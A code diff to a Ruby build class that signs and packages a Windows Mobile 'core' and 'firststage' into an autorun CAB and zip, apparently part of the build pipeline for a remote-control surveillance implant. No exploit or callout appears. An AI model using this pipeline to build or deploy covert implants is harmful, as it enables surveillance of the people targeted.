@@ -28,7 +28,7 @@ class BuildWinMo < Build
     super
 
     # sign the core after the binary patch
-    CrossPlatform.exec path('signtool'), "sign /P password /f pfx core"
+    CrossPlatform.exec path('signtool'), "sign /P password /f #{path('pfx')} #{path('core')}"
 
   end
 
@@ -85,24 +85,28 @@ class BuildWinMo < Build
       when 'remote'
         #TODO: move this in the melt phase
         File.rename(path('firststage'), path('autorun.exe'))
-        File.rename(path('ouput'), path('autorun.zoo'))
+        File.rename(path('output'), path('autorun.zoo'))
 
         # if the file 'user' is present, we need to include it in the cab
         # the file was saved during the melt phase
         if File.exist? path('user')
-          FileUtils.cp_r(path('custom/*'), path('.'))
+          FileUtils.cp_r(path('custom/.'), path('.'))
         else
-          FileUtils.cp_r(path('new/*'), path('.'))
+          FileUtils.cp_r(path('new/.'), path(''))
         end
 
-        CrossPlatform.exec path('cabwiz'), path('rcs.inf') + ' /dest ' + path() + ' /compress'
+        CrossPlatform.exec path('cabwiz'), path('rcs.inf').gsub("/", '\\') + ' /compress'
 
         File.exist? path('rcs.cab') || raise("output file not created by cabwiz")
 
-        FileUtils.mv path('rcs.cab'), path(@appname + '.cab')
+        File.rename path('rcs.cab'), path(@appname + '.cab')
 
+        Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
+          z.file.open(@appname + '.cab', "w") { |f| f.write File.open(path(@appname + '.cab'), 'rb') {|f| f.read} }
+        end
+        
         # this is the only file we need to output after this point
-        @outputs = [@appname + '.cab']
+        @outputs = ['output.zip']
     end
 
   end
